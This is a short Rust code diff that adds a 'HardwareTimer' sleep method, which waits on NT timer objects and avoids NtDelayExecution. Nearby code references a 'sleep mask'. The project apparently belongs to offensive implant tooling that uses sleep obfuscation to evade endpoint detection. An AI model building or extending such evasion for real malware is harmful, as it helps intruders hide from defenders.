@@ -241,6 +241,21 @@ pub fn execute_sleep(duration: std::time::Duration, config: &SleepConfig) -> Res
                 return Ok(());
             }
         }
+        SleepMethod::HardwareTimer => {
+            // Hardware-timer sleep: NtCreateTimer + NtSetTimer +
+            // NtWaitForSingleObject.  Avoids NtDelayExecution entirely.
+            #[cfg(target_arch = "x86_64")]
+            {
+                info!("Initiating hardware-timer sleep for {:?}", duration);
+                return crate::hw_timer_sleep::hardware_timer_sleep(duration);
+            }
+            #[cfg(not(target_arch = "x86_64"))]
+            {
+                info!("HardwareTimer not supported on non-x86_64, using standard sleep");
+                std::thread::sleep(duration);
+                return Ok(());
+            }
+        }
         _ => {
             if config.sleep_mask_enabled {
                 info!("Sleep-mask active for {:?}", duration);
